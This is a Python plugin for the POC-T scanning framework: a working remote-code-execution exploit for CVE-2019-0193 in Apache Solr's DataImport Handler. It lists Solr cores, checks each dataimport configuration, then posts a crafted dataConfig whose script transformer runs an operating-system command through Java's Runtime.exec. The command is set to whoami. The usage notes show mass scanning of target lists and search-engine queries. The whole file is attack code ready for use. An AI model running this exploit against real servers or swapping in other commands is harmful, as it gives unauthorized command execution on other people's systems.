#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = root@zuoxueba.org
# referer = " https://github.com/jas502n/CVE-2019-0193#cve-2019-0193--solr-dataimport-handler-rce-rce-vuln--solr-v812

"""
Apache Solr DataImport Handler 插件导致的RCE,
    (部分solr未安装该插件则不受影响)

这是POC, 测试指令cmd是whoami

 CVE-2019-0193 Solr DataImport Handler RCE 
    (RCE-Vuln <= solr v8.1.1)
    
Usage
  python POC-T.py -s solr-rce -iS http://192.168.1.1:8983
  
  python POC-T.py -s solr-rce -iF target.txt
  
  python POC-T.py -s solr-rce -aF "app=solr&&country=CN"

"""

import json
import sys
import requests
from plugin.useragent import firefox
from plugin.urlparser import iterate_path



def poc(target):
    cmd = 'whoami'
    base_url = target if "://" in target else 'http://' + target
    for each in iterate_path(base_url):
        try:
            url = each
            core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'
            r = requests.get(core_selector_url, headers={'User-Agent': firefox()})
            json_strs = json.loads(r.text)
            if r.status_code ==200 and "responseHeader" in r.text:
                for core_selector in json_strs['status']:
                    jas502n_Core_Name = json_strs['status']['%s'%core_selector]['name']
                    
                    # show_config(url,jas502n_Core_Name)
                    config_url = url + "/solr/"+ jas502n_Core_Name +"/dataimport?_=1565530241159&command=show-config&indent=on&wt=json"
                    r1 = requests.get(config_url)
                    if r1.status_code ==200 and 'dataConfig' in r1.text:
                    
                        # get_config_name(url,jas502n_Core_Name)
                        get_config_url = url + '/solr/'+ jas502n_Core_Name +'/dataimport?_=1565530241159&command=status&indent=on&wt=json'
                        r2 = requests.get(get_config_url)
                        if r2.status_code ==200 and 'config' in r2.text:
                            r2_json = json.loads(r2.text)
                            r2_str = r2_json['initArgs']
                            
                            # URLDataSource_Poc(url,jas502n_Core_Name,cmd):
                            debug_model_url = url + '/solr/'+ jas502n_Core_Name +'/dataimport?_=1565530241159&indent=on&wt=json'
                            payload = "command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&dataConfig=%%3CdataConfig%%3E%%0A++%%3CdataSource+type%%3D%%22URLDataSource%%22%%2F%%3E%%0A++%%3Cscript%%3E%%3C!%%5BCDATA%%5B%%0A++++++++++function+poc()%%7B+java.lang.Runtime.getRuntime().exec(%%22%s%%22)%%3B%%0A++++++++++%%7D%%0A++%%5D%%5D%%3E%%3C%%2Fscript%%3E%%0A++%%3Cdocument%%3E%%0A++++%%3Centity+name%%3D%%22stackoverflow%%22%%0A++++++++++++url%%3D%%22https%%3A%%2F%%2Fstackoverflow.com%%2Ffeeds%%2Ftag%%2Fsolr%%22%%0A++++++++++++processor%%3D%%22XPathEntityProcessor%%22%%0A++++++++++++forEach%%3D%%22%%2Ffeed%%22%%0A++++++++++++transformer%%3D%%22script%%3Apoc%%22+%%2F%%3E%%0A++%%3C%%2Fdocument%%3E%%0A%%3C%%2FdataConfig%%3E&name=dataimport" % cmd
                            headers = {
                            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
                            "Accept": "application/json, text/plain, */*",
                            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                            "Accept-Encoding":"gzip, deflate",
                            "Content-type":"application/x-www-form-urlencoded",
                            "X-Requested-With":"XMLHttpRequest",
                            "Referer":"http://%s/solr/" % url

                            }
                            r3 = requests.post(url = debug_model_url, data=payload,headers=headers)
                            if r3.status_code ==200 and 'Requests' in r3.text:

                                return url
                            else:
                                return False    
                                    
                                    
                        else:
                            #print "Core Config Name No Exit!"
                            return False    
    
                    else:
                        return False        
            
            else:
                return False
                
         
        except Exception:
            pass
            
    return False
